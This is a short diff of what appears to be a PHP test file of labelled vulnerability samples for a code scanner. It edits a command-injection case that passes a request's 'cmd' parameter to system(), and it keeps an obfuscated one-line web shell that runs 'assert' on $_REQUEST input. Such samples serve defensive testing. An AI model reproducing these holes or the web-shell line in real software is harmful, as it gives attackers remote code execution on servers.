@@ -17,7 +17,8 @@ if (isset($_GET['url']) {
 }
 
 # CVI-181001
-system('ls' + $_GET['directory']);
+$cmd = $_GET['cmd'];
+system('ls' + $cmd);
 
 # CVI-180001
 @array_map("ass\x65rt",(array)@$_REQUEST['a']);
